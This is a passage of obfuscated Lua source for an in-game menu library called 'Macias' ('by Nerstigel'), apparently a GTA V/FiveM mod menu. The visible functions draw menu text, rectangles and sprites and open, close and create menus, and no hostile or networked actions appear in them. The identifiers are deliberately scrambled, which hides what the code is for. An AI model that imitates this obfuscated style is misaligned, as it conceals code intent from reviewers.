            XO8g1Wb5PogWmMOsj4(N, "currentOption", 1)
        end
        if gh_SAmgyMC3n then
            if N ~= j0P1aYqgapaJmkYWlSEjf and nwxCxw1(j0P1aYqgapaJmkYWlSEjf) then
                RAmmfIbUBx(j0P1aYqgapaJmkYWlSEjf, false)
            end
            j0P1aYqgapaJmkYWlSEjf = N
        end
    end
end
local PMCF7AZl_TrF1lqi = false
local tfUirGWXEhIQebFmiE = true
local KhtMvtk783N9rO = true
function DrawTxt(GLWu, l87S8xEmRHc, W5KoJCpcqh4G1s45028b6, LyP2mc8mxQ0k1ZrU, AzLghXnfexH4U, yERMi69A0u5)
    SetTextColour(yERMi69A0u5.r, yERMi69A0u5.g, yERMi69A0u5.b, yERMi69A0u5.a)
    SetTextFont(4)
    SetTextCentre()
    SetTextProportional(1)
    SetTextScale(LyP2mc8mxQ0k1ZrU, AzLghXnfexH4U)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 255)
    SetTextDropShadow()
    if PMCF7AZl_TrF1lqi then
        SetTextOutline()
    end
    SetTextEntry("STRING")
    AddTextComponentString(GLWu)
    DrawText(l87S8xEmRHc, W5KoJCpcqh4G1s45028b6)
end
local function lSv6ZT0odUlcLyv(
    Lb,
    z85PMkWyIubKX0YgsE,
    I3yJW,
    LdGvLNrx9mFU7WAg8F5rF,
    CnM9Bh157lvey8oP8Q7sc,
    Kdg0u3vZ7O,
    nS7j4TXVPcJeVsf1y9,
    p4ghVX3bc94,
    fLQMzKOKpzIOx)
    SetTextColour(CnM9Bh157lvey8oP8Q7sc.r, CnM9Bh157lvey8oP8Q7sc.g, CnM9Bh157lvey8oP8Q7sc.b, CnM9Bh157lvey8oP8Q7sc.a)
    if tfUirGWXEhIQebFmiE then
        SetTextDropShadow(0, 0, 0, 0, 255)
    end
    SetTextEdge(2, 0, 0, 0, 255)
    if PMCF7AZl_TrF1lqi then
        SetTextOutline()
    end
    SetTextFont(LdGvLNrx9mFU7WAg8F5rF)
    SetTextScale(Kdg0u3vZ7O, Kdg0u3vZ7O)
    if p4ghVX3bc94 then
        SetTextDropShadow(2, 2, 0, 0, 0)
    end
    if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf] then
        if nS7j4TXVPcJeVsf1y9 then
            SetTextCentre(nS7j4TXVPcJeVsf1y9)
        elseif fLQMzKOKpzIOx then
            SetTextWrap(
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x,
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].width - kSVibjWpdXCC37
            )
            SetTextRightJustify(true)
        end
    end
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringPlayerName(Lb)
    EndTextCommandDisplayText(z85PMkWyIubKX0YgsE, I3yJW)
end
local function t(rr3Qc96x0sCNGF3AhE, NVHx5heubcaDG, MOgvf3Ot0hqTneIdl, x_8C9H, EyodOvviEVecr53tjrhG)
    DrawRect(
        rr3Qc96x0sCNGF3AhE,
        NVHx5heubcaDG,
        MOgvf3Ot0hqTneIdl,
        x_8C9H,
        EyodOvviEVecr53tjrhG.r,
        EyodOvviEVecr53tjrhG.g,
        EyodOvviEVecr53tjrhG.b,
        EyodOvviEVecr53tjrhG.a
    )
end
local function HjiQ()
    if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf] then
        local jakwhdOO = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].width / 2
        local bv3cQdz_7De31CvAUf =
            jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].width * y2ZqS01LgvjtSTQBJ
        local YzS_dp1 = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].y + DCOkHa_X39DI4tsCiPLk * 1 / yemRBopz2y
        if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].titleBackgroundSprite then
            DrawSprite(
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].titleBackgroundSprite.dict,
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].titleBackgroundSprite.name,
                jakwhdOO,
                YzS_dp1,
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].width,
                DCOkHa_X39DI4tsCiPLk,
                0,
                YKyAw.r,
                YKyAw.g,
                YKyAw.b,
                255
            )
        else
            t(
                jakwhdOO,
                YzS_dp1,
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].width,
                DCOkHa_X39DI4tsCiPLk,
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].titleBackgroundColor
            )
        end
        lSv6ZT0odUlcLyv(
            jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].title,
            bv3cQdz_7De31CvAUf,
            YzS_dp1 - DCOkHa_X39DI4tsCiPLk / 2 + vURx5kzEW,
            jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].titleFont,
            jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].titleColor,
            HaQjKKAMvjk5ABgT,
            true
        )
    end
end
local function K8pz9n()
    if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf] then
        local PxCkiN15HZrTBwbkzf =
            jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].width / 2
        local qZFiVu3M2AJllnk = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].y + DCOkHa_X39DI4tsCiPLk + QVCiRDDcBBAaEe / 2
        local PmTT = {r = YKyAw.r, g = YKyAw.g, b = YKyAw.b, a = 255}
        t(
            PxCkiN15HZrTBwbkzf,
            qZFiVu3M2AJllnk,
            jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].width,
            QVCiRDDcBBAaEe,
            jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].subTitleBackgroundColor
        )
        lSv6ZT0odUlcLyv(
            jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].subTitle,
            jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + kSVibjWpdXCC37,
            qZFiVu3M2AJllnk - QVCiRDDcBBAaEe / 2 + Y6ZS8iMhTJOjBq0rm,
            i3dUIc_3f4,
            PmTT,
            lEA8M97Noop,
            false
        )
        if BAA0iTdNpUgW06 > jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].maxOptionCount then
            lSv6ZT0odUlcLyv(
                tostring(jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption) .. " / " .. tostring(BAA0iTdNpUgW06),
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].width,
                qZFiVu3M2AJllnk - QVCiRDDcBBAaEe / 2 + Y6ZS8iMhTJOjBq0rm,
                i3dUIc_3f4,
                PmTT,
                lEA8M97Noop,
                false,
                false,
                true
            )
        end
    end
end
local function Rl7pAj5p0QyCKrw1DPsOX(mLvDjnmOPK, Z0tj, mHdcD6jrSq, JTD)
    local jgwVQEvV = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].width / 2
    local UxU2SK = nil
    if
        jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption <= jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].maxOptionCount and
            BAA0iTdNpUgW06 <= jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].maxOptionCount
     then
        UxU2SK = BAA0iTdNpUgW06
    elseif
        BAA0iTdNpUgW06 >
            jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption - jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].maxOptionCount and
            BAA0iTdNpUgW06 <= jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption
     then
        UxU2SK =
            BAA0iTdNpUgW06 -
            (jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption -
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].maxOptionCount)
    end
    if UxU2SK then
        local QZfcBq2JIeUMa6Gdnm5TX =
            jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].y + DCOkHa_X39DI4tsCiPLk + QVCiRDDcBBAaEe + (QVCiRDDcBBAaEe * UxU2SK) -
            QVCiRDDcBBAaEe / 2
        local MQE7a5 = nil
        local ePL = nil
        local zptuvpBD1OAEGmKtntz38 = nil
        local DxviWzJmjqOIzmwjVbM = false
        if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption == BAA0iTdNpUgW06 then
            MQE7a5 = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].menuFocusBackgroundColor
            ePL = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].menuFocusTextColor
            zptuvpBD1OAEGmKtntz38 = {r = YKyAw.r, g = YKyAw.g, b = YKyAw.b, a = 255}
        else
            MQE7a5 = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].menuBackgroundColor
            ePL = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].menuTextColor
            zptuvpBD1OAEGmKtntz38 = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].menuSubTextColor
            DxviWzJmjqOIzmwjVbM = true
        end
        t(jgwVQEvV, QZfcBq2JIeUMa6Gdnm5TX, jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].width, QVCiRDDcBBAaEe, MQE7a5)
        if JTD then
            if not HasStreamedTextureDictLoaded(JTD.dict) then
                RequestStreamedTextureDict(JTD.dict, true)
            end
            if PMCF7AZl_TrF1lqi then
                DrawSprite(
                    JTD.dict,
                    JTD.text,
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + kSVibjWpdXCC37 + 0.008,
                    QZfcBq2JIeUMa6Gdnm5TX - (QVCiRDDcBBAaEe / 2) + Y6ZS8iMhTJOjBq0rm + 0.0125,
                    0.0275,
                    0.0375,
                    0,
                    0,
                    0,
                    0,
                    255
                )
            end
            DrawSprite(
                JTD.dict,
                JTD.text,
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + kSVibjWpdXCC37 + 0.008,
                QZfcBq2JIeUMa6Gdnm5TX - (QVCiRDDcBBAaEe / 2) + Y6ZS8iMhTJOjBq0rm + 0.0125,
                0.0255,
                0.0355,
                0,
                YKyAw.r,
                YKyAw.g,
                YKyAw.b,
                155
            )
            DrawSprite(
                JTD.dict,
                JTD.text,
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + kSVibjWpdXCC37 + 0.008,
                QZfcBq2JIeUMa6Gdnm5TX - (QVCiRDDcBBAaEe / 2) + Y6ZS8iMhTJOjBq0rm + 0.0125,
                0.0225,
                0.0325,
                0,
                JTD.color.r,
                JTD.color.g,
                JTD.color.b,
                255
            )
            lSv6ZT0odUlcLyv(
                Z0tj,
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + kSVibjWpdXCC37 + 0.018,
                QZfcBq2JIeUMa6Gdnm5TX - (QVCiRDDcBBAaEe / 2) + Y6ZS8iMhTJOjBq0rm,
                i3dUIc_3f4,
                ePL,
                lEA8M97Noop,
                false,
                DxviWzJmjqOIzmwjVbM
            )
        else
            lSv6ZT0odUlcLyv(
                Z0tj,
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + kSVibjWpdXCC37,
                QZfcBq2JIeUMa6Gdnm5TX - (QVCiRDDcBBAaEe / 2) + Y6ZS8iMhTJOjBq0rm,
                i3dUIc_3f4,
                ePL,
                lEA8M97Noop,
                false,
                DxviWzJmjqOIzmwjVbM
            )
        end
        if mHdcD6jrSq then
            lSv6ZT0odUlcLyv(
                mHdcD6jrSq,
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + kSVibjWpdXCC37,
                QZfcBq2JIeUMa6Gdnm5TX - QVCiRDDcBBAaEe / 2 + Y6ZS8iMhTJOjBq0rm,
                i3dUIc_3f4,
                zptuvpBD1OAEGmKtntz38,
                lEA8M97Noop,
                false,
                DxviWzJmjqOIzmwjVbM,
                true
            )
        end
        if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption == BAA0iTdNpUgW06 and mLvDjnmOPK then
            if not HasStreamedTextureDictLoaded("commonmenu") then
                RequestStreamedTextureDict("commonmenu", true)
            end
            if PMCF7AZl_TrF1lqi then
                DrawSprite(
                    "commonmenu",
                    "arrowright",
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + kSVibjWpdXCC37 + 0.24,
                    QZfcBq2JIeUMa6Gdnm5TX - (QVCiRDDcBBAaEe / 2) + Y6ZS8iMhTJOjBq0rm + 0.0125,
                    0.0245,
                    0.0365,
                    0,
                    0,
                    0,
                    0,
                    255
                )
            end
            DrawSprite(
                "commonmenu",
                "arrowright",
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + kSVibjWpdXCC37 + 0.24,
                QZfcBq2JIeUMa6Gdnm5TX - (QVCiRDDcBBAaEe / 2) + Y6ZS8iMhTJOjBq0rm + 0.0125,
                0.0225,
                0.0325,
                0,
                YKyAw.r,
                YKyAw.g,
                YKyAw.b,
                255
            )
        elseif mLvDjnmOPK then
            if not HasStreamedTextureDictLoaded("commonmenu") then
                RequestStreamedTextureDict("commonmenu", true)
            end
            if PMCF7AZl_TrF1lqi then
                DrawSprite(
                    "commonmenu",
                    "arrowright",
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + kSVibjWpdXCC37 + 0.24,
                    QZfcBq2JIeUMa6Gdnm5TX - (QVCiRDDcBBAaEe / 2) + Y6ZS8iMhTJOjBq0rm + 0.0125,
                    0.0245,
                    0.0365,
                    0,
                    0,
                    0,
                    0,
                    255
                )
            end
            DrawSprite(
                "commonmenu",
                "arrowright",
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + kSVibjWpdXCC37 + 0.24,
                QZfcBq2JIeUMa6Gdnm5TX - (QVCiRDDcBBAaEe / 2) + Y6ZS8iMhTJOjBq0rm + 0.0125,
                0.0225,
                0.0325,
                0,
                175,
                175,
                175,
                155
            )
        end
        if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption == BAA0iTdNpUgW06 and KhtMvtk783N9rO then
            if not HasStreamedTextureDictLoaded("deadline") then
                RequestStreamedTextureDict("deadline", true)
            end
            DrawSprite(
                "deadline",
                "deadline_trail_01",
                jgwVQEvV,
                QZfcBq2JIeUMa6Gdnm5TX,
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].width,
                QVCiRDDcBBAaEe,
                0,
                YKyAw.r,
                YKyAw.g,
                YKyAw.b,
                55
            )
        end
    end
end
local function eG31QXw7HZMGAVyISh(kPPzw6Df, S29guDG)
    local orPg7LIV55nPC6ha9U4p =
        jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].width / 2
    local UuqUmnyWM = nil
    if
        jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption <= jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].maxOptionCount and
            BAA0iTdNpUgW06 <= jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].maxOptionCount
     then
        UuqUmnyWM = BAA0iTdNpUgW06
    elseif
        BAA0iTdNpUgW06 >
            jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption - jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].maxOptionCount and
            BAA0iTdNpUgW06 <= jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption
     then
        UuqUmnyWM =
            BAA0iTdNpUgW06 -
            (jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption -
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].maxOptionCount)
    end
    if UuqUmnyWM then
        local Vin =
            jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].y + DCOkHa_X39DI4tsCiPLk + QVCiRDDcBBAaEe +
            (QVCiRDDcBBAaEe * UuqUmnyWM) -
            QVCiRDDcBBAaEe / 2
        local URx9ZJ0TSbQB = nil
        local R_whNi_K = nil
        local fGONNec_j8Y2ynuK = false
        if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption == BAA0iTdNpUgW06 then
            URx9ZJ0TSbQB = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].menuFocusBackgroundColor
            R_whNi_K = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].menuFocusTextColor
        else
            URx9ZJ0TSbQB = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].menuBackgroundColor
            R_whNi_K = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].menuTextColor
            fGONNec_j8Y2ynuK = true
        end
        t(orPg7LIV55nPC6ha9U4p, Vin, jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].width, QVCiRDDcBBAaEe, URx9ZJ0TSbQB)
        lSv6ZT0odUlcLyv(
            kPPzw6Df,
            jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + kSVibjWpdXCC37,
            Vin - (QVCiRDDcBBAaEe / 2) + Y6ZS8iMhTJOjBq0rm,
            i3dUIc_3f4,
            R_whNi_K,
            lEA8M97Noop,
            false,
            fGONNec_j8Y2ynuK
        )
        if not HasStreamedTextureDictLoaded("helicopterhud") then
            RequestStreamedTextureDict("helicopterhud", true)
        end
        if not HasStreamedTextureDictLoaded("commonmenu") then
            RequestStreamedTextureDict("commonmenu", true)
        end
        if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption == BAA0iTdNpUgW06 then
            if S29guDG then
                DrawSprite(
                    "helicopterhud",
                    "hud_outline",
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + kSVibjWpdXCC37 + 0.235,
                    Vin - (QVCiRDDcBBAaEe / 2) + Y6ZS8iMhTJOjBq0rm + 0.01375,
                    0.0225,
                    0.0325,
                    0,
                    YKyAw.r,
                    YKyAw.g,
                    YKyAw.b,
                    255
                )
                DrawSprite(
                    "commonmenu",
                    "shop_tick_icon",
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + kSVibjWpdXCC37 + 0.235,
                    Vin - (QVCiRDDcBBAaEe / 2) + Y6ZS8iMhTJOjBq0rm + 0.0125,
                    0.0325,
                    0.0425,
                    0,
                    YKyAw.r,
                    YKyAw.g,
                    YKyAw.b,
                    255
                )
            else
                DrawSprite(
                    "helicopterhud",
                    "hud_lock",
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + kSVibjWpdXCC37 + 0.235,
                    Vin - (QVCiRDDcBBAaEe / 2) + Y6ZS8iMhTJOjBq0rm + 0.01375,
                    0.0225,
                    0.0325,
                    0,
                    YKyAw.r,
                    YKyAw.g,
                    YKyAw.b,
                    255
                )
            end
        else
            if S29guDG then
                DrawSprite(
                    "helicopterhud",
                    "hud_outline",
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + kSVibjWpdXCC37 + 0.235,
                    Vin - (QVCiRDDcBBAaEe / 2) + Y6ZS8iMhTJOjBq0rm + 0.01375,
                    0.0225,
                    0.0325,
                    0,
                    155,
                    155,
                    155,
                    255
                )
                DrawSprite(
                    "commonmenu",
                    "shop_tick_icon",
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + kSVibjWpdXCC37 + 0.235,
                    Vin - (QVCiRDDcBBAaEe / 2) + Y6ZS8iMhTJOjBq0rm + 0.0125,
                    0.0325,
                    0.0425,
                    0,
                    155,
                    155,
                    155,
                    255
                )
            else
                DrawSprite(
                    "helicopterhud",
                    "hud_lock",
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + kSVibjWpdXCC37 + 0.235,
                    Vin - (QVCiRDDcBBAaEe / 2) + Y6ZS8iMhTJOjBq0rm + 0.01375,
                    0.0225,
                    0.0325,
                    0,
                    155,
                    155,
                    155,
                    255
                )
            end
        end
        if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption == BAA0iTdNpUgW06 and KhtMvtk783N9rO then
            if not HasStreamedTextureDictLoaded("deadline") then
                RequestStreamedTextureDict("deadline", true)
            end
            DrawSprite(
                "deadline",
                "deadline_trail_01",
                orPg7LIV55nPC6ha9U4p,
                Vin,
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].width,
                QVCiRDDcBBAaEe,
                0,
                YKyAw.r,
                YKyAw.g,
                YKyAw.b,
                55
            )
        end
    end
end
menus_listMaciasMacias = {}
function Macias.CreateMenu(jwBQUGRXlPi, tv)
    table.insert(menus_listMaciasMacias, jwBQUGRXlPi)
    jwZvXv7xDjl3iWV[jwBQUGRXlPi] = {}
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].title = tv
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].subTitle = "by N~s~er~s~t~s~ig~s~el"
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].visible = false
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].previousMenu = nil
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].aboutToBeClosed = false
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].x = 0.0175
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].y = 0.025
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].width = 0.23
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].currentOption = 1
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].maxOptionCount = BkEd5E1GYgoliqD9ktVZ
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].titleFont = 1
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].titleColor = {r = 0, g = 0, b = 0, a = 255}
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].titleBackgroundColor = {r = 0, g = 0, b = 0, a = 255}
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].titleBackgroundSprite = nil
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].menuTextColor = {r = 150, g = 150, b = 150, a = 255}
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].menuSubTextColor = {r = 0, g = 0, b = 0, a = 255}
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].menuFocusTextColor = {r = 155, g = 155, b = 155, a = 255}
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].menuFocusBackgroundColor = {r = 0, g = 0, b = 0, a = 255}
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].menuBackgroundColor = {r = 55, g = 55, b = 55, a = 255}
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].subTitleBackgroundColor = {r = 35, g = 35, b = 35, a = 255}
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].subTitleTextColor = {r = YKyAw.r, g = YKyAw.g, b = YKyAw.b, a = 255}
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"}
    wBQ8ncN2OyoKWmCo(tostring(jwBQUGRXlPi) .. " menu created")
end
function Macias.CreateSubMenu(o5_Y4K3Wo8umqV9Jq, K_UkYz2xIa, S30rdV)
    if jwZvXv7xDjl3iWV[K_UkYz2xIa] then
        Macias.CreateMenu(o5_Y4K3Wo8umqV9Jq, jwZvXv7xDjl3iWV[K_UkYz2xIa].title)
        if S30rdV then
            XO8g1Wb5PogWmMOsj4(o5_Y4K3Wo8umqV9Jq, "subTitle", S30rdV)
        else
            XO8g1Wb5PogWmMOsj4(o5_Y4K3Wo8umqV9Jq, "subTitle", jwZvXv7xDjl3iWV[K_UkYz2xIa].subTitle)
        end
        XO8g1Wb5PogWmMOsj4(o5_Y4K3Wo8umqV9Jq, "previousMenu", K_UkYz2xIa)
        XO8g1Wb5PogWmMOsj4(o5_Y4K3Wo8umqV9Jq, "x", jwZvXv7xDjl3iWV[K_UkYz2xIa].x)
        XO8g1Wb5PogWmMOsj4(o5_Y4K3Wo8umqV9Jq, "y", jwZvXv7xDjl3iWV[K_UkYz2xIa].y)
        XO8g1Wb5PogWmMOsj4(o5_Y4K3Wo8umqV9Jq, "maxOptionCount", jwZvXv7xDjl3iWV[K_UkYz2xIa].maxOptionCount)
        XO8g1Wb5PogWmMOsj4(o5_Y4K3Wo8umqV9Jq, "titleFont", jwZvXv7xDjl3iWV[K_UkYz2xIa].titleFont)
        XO8g1Wb5PogWmMOsj4(o5_Y4K3Wo8umqV9Jq, "titleColor", jwZvXv7xDjl3iWV[K_UkYz2xIa].titleColor)
        XO8g1Wb5PogWmMOsj4(o5_Y4K3Wo8umqV9Jq, "titleBackgroundColor", jwZvXv7xDjl3iWV[K_UkYz2xIa].titleBackgroundColor)
        XO8g1Wb5PogWmMOsj4(
            o5_Y4K3Wo8umqV9Jq,
            "titleBackgroundSprite",
            jwZvXv7xDjl3iWV[K_UkYz2xIa].titleBackgroundSprite
        )
        XO8g1Wb5PogWmMOsj4(o5_Y4K3Wo8umqV9Jq, "menuTextColor", jwZvXv7xDjl3iWV[K_UkYz2xIa].menuTextColor)
        XO8g1Wb5PogWmMOsj4(o5_Y4K3Wo8umqV9Jq, "menuSubTextColor", jwZvXv7xDjl3iWV[K_UkYz2xIa].menuSubTextColor)
        XO8g1Wb5PogWmMOsj4(o5_Y4K3Wo8umqV9Jq, "menuFocusTextColor", jwZvXv7xDjl3iWV[K_UkYz2xIa].menuFocusTextColor)
        XO8g1Wb5PogWmMOsj4(
            o5_Y4K3Wo8umqV9Jq,
            "menuFocusBackgroundColor",
            jwZvXv7xDjl3iWV[K_UkYz2xIa].menuFocusBackgroundColor
        )
        XO8g1Wb5PogWmMOsj4(o5_Y4K3Wo8umqV9Jq, "menuBackgroundColor", jwZvXv7xDjl3iWV[K_UkYz2xIa].menuBackgroundColor)
        XO8g1Wb5PogWmMOsj4(
            o5_Y4K3Wo8umqV9Jq,
            "subTitleBackgroundColor",
            jwZvXv7xDjl3iWV[K_UkYz2xIa].subTitleBackgroundColor
        )
    else
        wBQ8ncN2OyoKWmCo(
            "Failed to create " ..
                tostring(o5_Y4K3Wo8umqV9Jq) .. " submenu: " .. tostring(K_UkYz2xIa) .. " parent menu doesn't exist"
        )
    end
end
function Macias.CurrentMenu()
    return j0P1aYqgapaJmkYWlSEjf
end
function Macias.OpenMenu(Wy2HuhjnUT)
    if Wy2HuhjnUT and jwZvXv7xDjl3iWV[Wy2HuhjnUT] then
        PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
        RAmmfIbUBx(Wy2HuhjnUT, true)
        wBQ8ncN2OyoKWmCo(tostring(Wy2HuhjnUT) .. " menu opened")
    else
        wBQ8ncN2OyoKWmCo("Failed to open " .. tostring(Wy2HuhjnUT) .. " menu: it doesn't exist")
    end
end
function Macias.IsMenuOpened(lz9JKSXu5)
    return nwxCxw1(lz9JKSXu5)
end
function Macias.IsAnyMenuOpened()
    for QUy9Ag7ouEu, BPrxlaU79 in pairs(jwZvXv7xDjl3iWV) do
        if nwxCxw1(QUy9Ag7ouEu) then
            return true
        end
    end
    return false
end
function Macias.IsMenuAboutToBeClosed()
    if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf] then
        return jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].aboutToBeClosed
    else
        return false
    end
end
function Macias.CloseMenu()
    if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf] then
        if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].aboutToBeClosed then
            jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].aboutToBeClosed = false
            RAmmfIbUBx(j0P1aYqgapaJmkYWlSEjf, false)
            wBQ8ncN2OyoKWmCo(tostring(j0P1aYqgapaJmkYWlSEjf) .. " menu closed")
            PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            BAA0iTdNpUgW06 = 0
            j0P1aYqgapaJmkYWlSEjf = nil
            MvpYLMwDWCTCY5gZhBpjy = nil
        else
            jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].aboutToBeClosed = true
            wBQ8ncN2OyoKWmCo(tostring(j0P1aYqgapaJmkYWlSEjf) .. " menu about to be closed")
        end
    end
end
function Macias.Button(ku9eSQBeIjpD5OSIkEo, k59Afs, oMOmUf0EItEu1d)
    local fWZcNM5KRxMvcNhIv = ku9eSQBeIjpD5OSIkEo
    if k59Afs then
        fWZcNM5KRxMvcNhIv = "{ " .. tostring(fWZcNM5KRxMvcNhIv) .. ", " .. tostring(k59Afs) .. " }"
